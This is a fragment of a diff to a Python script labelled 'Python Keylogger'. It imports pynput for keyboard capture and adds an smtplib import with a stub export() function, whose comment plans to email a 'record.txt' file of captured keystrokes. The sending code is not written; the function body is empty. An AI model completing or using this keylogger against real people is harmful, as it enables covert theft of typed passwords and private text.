@@ -3,7 +3,11 @@ Python Keylogger
 By Connor Jackson
 """
 from pynput import keyboard
+import smtplib
 
+def export():
+    # Send email with record.txt using smtplib (Might change method to seperate file)
+    pass
 
 def on_press(key):
     try:
